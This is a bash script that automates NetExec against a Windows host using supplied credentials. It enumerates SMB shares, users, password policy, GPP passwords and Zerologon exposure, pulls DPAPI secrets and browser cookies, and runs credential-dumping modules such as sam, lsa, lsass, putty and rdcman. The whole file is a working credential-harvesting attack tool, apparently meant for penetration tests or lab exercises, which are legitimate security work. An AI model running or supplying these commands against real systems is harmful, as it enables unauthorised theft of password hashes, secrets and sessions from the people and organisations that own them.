#!/usr/bin/env bash
# Author: strikoder
# File: auth_smb.sh
# Usage: ./auth_smb.sh -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]
set -euo pipefail

IP=""; USER=""; PASS=""; DOMAIN=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t) IP="$2"; shift 2 ;;
    -u) USER="$2"; shift 2 ;;
    -p) PASS="$2"; shift 2 ;;
    -d) DOMAIN="$2"; shift 2 ;;
    *) echo "Usage: $0 -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]"; exit 1 ;;
  esac
done
[[ -z "$IP" || -z "$USER" || -z "$PASS" ]] && { echo "Missing -t/-u/-p"; exit 1; }
command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }

log(){ echo -e "\n==== $* ====\n"; }

# Auth modes
if [[ -n "$DOMAIN" ]]; then
  MODE="domain"
  BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
else
  MODE="local"
  BASE=(--local-auth -u "$USER" -p "$PASS")
fi
log "Auth mode: $MODE"

# Capabilities
HELP="$(nxc smb -h 2>&1 || true)"
have_flag(){ grep -q -- "$1" <<<"$HELP"; }
have_mod(){ nxc smb -L 2>/dev/null | awk '{print $1}' | sed 's/^-//' | grep -q "^$1$"; }

## 1) SMB recon (per-flag, clear output)
for f in --shares --users --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --gpp_autologin --zerologon; do
  if have_flag "$f"; then
    log "Now running SMB flag: $f"
    nxc smb "$IP" "${BASE[@]}" "$f" || true
  else
    log "SMB flag not supported in this build: $f"
  fi
done

## 1b) LDAP recon (only when domain auth)
if [[ "$MODE" == "domain" ]]; then
  if nxc ldap -h 2>&1 | grep -q -- "--groups"; then
    log "Now running LDAP: --groups"
    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
  else
    log "LDAP --groups not supported in this build"
  fi
else
  log "Skipping LDAP --groups (needs domain auth)"
fi

## 2) DPAPI variants
if have_flag "--dpapi"; then
  log "DPAPI: base"
  nxc smb "$IP" "${BASE[@]}" --dpapi || true

  log "DPAPI: cookies"
  nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true

  log "DPAPI: nosystem"
  nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true

  if [[ "$MODE" == "local" ]]; then
    log "DPAPI: nosystem (explicit local-auth)"
    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
  else
    log "Skipping DPAPI local-auth variant (domain mode)"
  fi
fi

## 3) Modules
NOT_AVAILABLE=()
for m in spider_plus sam lsa lsass putty backup_operator rdcman; do
  if have_mod "$m"; then
    log "Module: $m"
    nxc smb "$IP" "${BASE[@]}" -M "$m" || true
  else
    NOT_AVAILABLE+=("$m")
  fi
done

if [[ ${#NOT_AVAILABLE[@]} -gt 0 ]]; then
  log "Modules not supported by this nxc build (or need --local-auth i.e: remove the -d): ${NOT_AVAILABLE[*]}"
fi

# Final notes (printed only)
log "Summary / Tips"
cat <<'EOT'
- Domain mode is used when -d <DOMAIN> is provided; otherwise the script uses --local-auth.
- LDAP --groups runs only in domain mode.
- Some modules need local admin (sam/lsa/lsass/putty/ldapi). backup_operator needs SeBackupPrivilege.
- DPAPI variants run in both modes; the explicit local-auth variant runs only in local mode.
EOT
